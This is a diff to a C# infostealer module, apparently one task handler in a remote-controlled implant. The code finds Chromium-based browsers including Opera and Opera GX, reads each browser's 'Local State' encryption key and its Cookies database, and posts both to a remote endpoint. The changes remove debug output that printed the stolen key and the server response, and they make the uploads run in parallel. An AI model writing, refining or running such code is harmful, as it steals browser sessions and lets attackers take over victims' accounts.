@@ -5,6 +5,7 @@ using System.Text;
 using System.Security.Cryptography;
 using System.Web.Script.Serialization;
 using System.Net.Http;
+using System.Collections.Generic;
 
 public class Script
 {
@@ -65,11 +66,6 @@ public class Script
         }
 	public static async Task SendCookiesDBWithRetry(string endpointUrl, string browser, byte[] secretKey, string dataPath, int maxRetries)
 	{
-        Console.WriteLine("Endpoint: " + endpointUrl +
-                         ", Browser: " + browser +
-                         ", Secret Key: " + BitConverter.ToString(secretKey) +
-                         ", Data Path: " + dataPath +
-                         ", Max Retries: " + maxRetries);
         TimeSpan delay = TimeSpan.FromSeconds(10);
 		int retryCount = 0;
 		while (retryCount < maxRetries)
@@ -89,7 +85,6 @@ public class Script
 					var content = new StringContent(contectData, Encoding.UTF8, "application/json");
 					client.Timeout = TimeSpan.FromMinutes(10);
 					HttpResponseMessage response = await client.PostAsync(endpointUrl, content);
-					Console.WriteLine("Response Status Code: " + (int)response.StatusCode + " - " + response.StatusCode);
                     if (response.IsSuccessStatusCode)
 					{
 						break;
@@ -116,33 +111,41 @@ public class Script
 	
     public static async Task<object> ExecuteAsync(string endpoint, string uuid, long instructionId, short code)
     {
-        foreach (string browser in chromiumBrowsers)
-            {
-                string secretKeyPath, DataPath;
-                if (browser.Contains("Opera Stable"))
-                {
-                    secretKeyPath = default_appdata + browser + @"\Local State";
-                    DataPath = default_appdata + browser + @"\Default\Network\Cookies";
-                }
-                else if (browser.Contains("Opera GX Stable"))
-                {
-                    secretKeyPath = default_appdata + browser + @"\Local State";
-                    DataPath = default_appdata + browser + @"\Network\Cookies";
-                }
-                else
-                {
-                    secretKeyPath = local_appdata + browser + @"\User Data\Local State";
-                    DataPath = local_appdata + browser + @"\User Data\Default\Network\Cookies";
-                }
-                byte[] readSecretKey = GetChromiumBasedSecretKey(secretKeyPath);
+        List<Task> tasks = new List<Task>();
 
-                if (readSecretKey != null && File.Exists(DataPath))
-                {
-                    // Send The File And The Secret Key to an EndPoint
-                    await SendCookiesDBWithRetry(endpoint+ "Response/Browser/Cookies/" + uuid, browser, readSecretKey, DataPath, 10);
-                }
+        foreach (string browser in chromiumBrowsers)
+        {
+            string secretKeyPath, DataPath;
+            if (browser.Contains("Opera Stable"))
+            {
+                secretKeyPath = default_appdata + browser + @"\Local State";
+                DataPath = default_appdata + browser + @"\Default\Network\Cookies";
             }
-            return "Done";
+            else if (browser.Contains("Opera GX Stable"))
+            {
+                secretKeyPath = default_appdata + browser + @"\Local State";
+                DataPath = default_appdata + browser + @"\Network\Cookies";
+            }
+            else
+            {
+                secretKeyPath = local_appdata + browser + @"\User Data\Local State";
+                DataPath = local_appdata + browser + @"\User Data\Default\Network\Cookies";
+            }
+
+            byte[] readSecretKey = GetChromiumBasedSecretKey(secretKeyPath);
+
+            if (readSecretKey != null && File.Exists(DataPath))
+            {
+                // Start the SendCookiesDBWithRetry task without awaiting it immediately
+                var task = SendCookiesDBWithRetry(endpoint + "Response/Browser/Cookies/" + uuid, browser, readSecretKey, DataPath, 10);
+                tasks.Add(task); // Add the task to the list
+            }
+        }
+
+        await Task.WhenAll(tasks);
+    
+        return null;
     }
+
 
 }
